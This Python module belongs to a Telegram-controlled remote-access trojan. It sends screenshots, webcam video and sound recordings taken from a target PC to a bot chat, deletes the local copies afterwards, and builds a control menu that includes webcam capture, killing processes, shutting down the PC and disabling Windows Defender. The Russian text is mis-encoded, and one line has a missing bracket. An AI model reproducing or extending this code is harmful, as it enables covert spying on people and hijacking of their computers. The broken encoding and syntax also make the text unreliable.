import os
import random
import time
import asyncio
from telegram import Bot, ReplyKeyboardMarkup, KeyboardButton

def generate_temp_filename(extension):
    random_str = ''.join([str(time.time()).replace('.', '')[-6:], os.urandom(4).hex()])
    return os.path.join(os.getenv('TEMP'), f"tmp_{random_str}.{extension}")

async def send_message(user_id, text, reply_markup=None):
    try:
        bot = Bot(token=BOT_TOKEN)
        message = await bot.send_message(chat_id=user_id, text=text, reply_markup=reply_markup)
        return message.message_id
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
        return None

async def delete_message(user_id, message_id):
    try:
        if message_id:
            bot = Bot(token=BOT_TOKEN)
            await bot.delete_message(chat_id=user_id, message_id=message_id)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")

async def send_screenshot(user_id, filename, pending_message_id=None):
    try:
        bot = Bot(token=BOT_TOKEN)
        with open(filename, 'rb') as photo:
            await bot.send_photo(chat_id=user_id, photo=photo)
        os.remove(filename)
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return True
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return False

async def send_video(user_id, filename, pending_message_id=None):
    try:
        file_size = os.path.getsize(filename) / (1024 * 1024)
        if file_size > 50:
            print(f"‚ùå –í–∏–¥–µ–æ —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–µ ({file_size:.2f} –ú–ë)")
            if pending_message_id:
                await delete_message(user_id, pending_message_id)
            await send_message(user_id, f"‚ùå –í–∏–¥–µ–æ —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–µ ({file_size:.2f} –ú–ë)")
            os.remove(filename)
            return False
            
        bot = Bot(token=BOT_TOKEN)
        with open(filename, 'rb') as video:
            await bot.send_video(chat_id=user_id, video=video)
        os.remove(filename)
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return True
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤–∏–¥–µ–æ: {e}")
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return False

async def send_voice(user_id, filename, pending_message_id=None):
    try:
        bot = Bot(token=BOT_TOKEN)
        with open(filename, 'rb') as voice:
            await bot.send_voice(chat_id=user_id, voice=voice)
        os.remove(filename)
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return True
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≥–æ–ª–æ—Å–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return False

def create_message_type_menu():
    return ReplyKeyboardMarkup([
        [KeyboardButton("üì¢ –í—ã–∑–≤–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ"), KeyboardButton("‚ö†Ô∏è –í—ã–∑–≤–∞—Ç—å –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ")],
        [KeyboardButton("‚ùå –í—ã–∑–≤–∞—Ç—å –æ—à–∏–±–∫—É"), KeyboardButton("üîô –ù–∞–∑–∞–¥")]
    ], resize_keyboard=True)

def create_device_menu(device_name):
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç"), KeyboardButton(text="üì∏ –§–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")],
            [KeyboardButton(text="üé• –°–¥–µ–ª–∞—Ç—å –≤–∏–¥–µ–æ"), KeyboardButton(text="üé• –í–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")],
            [KeyboardButton(text="üéô –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞"), KeyboardButton(text="üí¨ –ù–∞–ø–∏—Å–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ")],
            [KeyboardButton(text="üõ° –ê–Ω—Ç–∏–≤–∏—Ä—É—Å"), KeyboardButton(text="üìä –ü—Ä–æ—Ü–µ—Å—Å—ã")],
            [KeyboardButton(text="üíÄ –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å"), KeyboardButton(text="üíÄ –ó–∞–≤–µ—Ä—à–∏—Ç—å –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å")],
            [KeyboardButton(text="‚å®Ô∏è –ù–∞–∂–∞—Ç—å –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –∫–ª–∞–≤–∏—à"), KeyboardButton(text="‚¨áÔ∏è –°–≤–µ—Ä–Ω—É—Ç—å –æ–∫–Ω–æ")],
            [KeyboardButton(text="üì• –°–≤–µ—Ä–Ω—É—Ç—å –≤—Å–µ"), KeyboardButton(text="üñ± –î–µ—Ä–≥–∞—Ç—å –º—ã—à–∫–æ–π")],
            [KeyboardButton(text="üîä –í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫"), KeyboardButton(text="üîá –í—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫")],
            [KeyboardButton(text="üîå –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö"), KeyboardButton(text="üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö")],
            [KeyboardButton(text="üåê –ë—Ä–∞—É–∑–µ—Ä—ã"), KeyboardButton(text="üõ° –û—Ç–∫–ª—é—á–∏—Ç—å Defender")],
            [KeyboardButton(text="üîô –ù–∞–∑–∞–¥")]
        ],
        resize_keyboard=True
    )

async def create_processes_menu(user_id, page=0):
    try:
        procs = modules['processes'].get_process_list()
        total_processes = len(procs)
        total_pages = (total_processes + 4) // 5
        start_index = page * 5
        end_index = start_index + 5
        
        keyboard = []
        message = f"üìä –ü—Ä–æ—Ü–µ—Å—Å–æ–≤: {total_processes} | –°—Ç—Ä–∞–Ω–∏—Ü–∞ {page + 1}/{total_pages}\n"
        
        for proc in procs[start_index:end_index]:
            keyboard.append([KeyboardButton(f"üîπ {proc['name']} (PID: {proc['pid']})")
        
        nav_buttons = []
        if page > 0:
            nav_buttons.append(KeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥"))
        if end_index < total_processes:
            nav_buttons.append(KeyboardButton("‚û°Ô∏è –í–ø–µ—Ä–µ–¥"))
        
        if nav_buttons:
            keyboard.append(nav_buttons)
        
        keyboard.append([KeyboardButton("üîô –ù–∞–∑–∞–¥")])
        return ReplyKeyboardMarkup(keyboard, resize_keyboard=True), message
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –º–µ–Ω—é –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {e}")
        return None, f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {e}"

def initialize(bot_token, chat_ids, device_name):
    global BOT_TOKEN, CHAT_IDS, DEVICE_NAME
    BOT_TOKEN = bot_token
    CHAT_IDS = chat_ids
    DEVICE_NAME = device_name
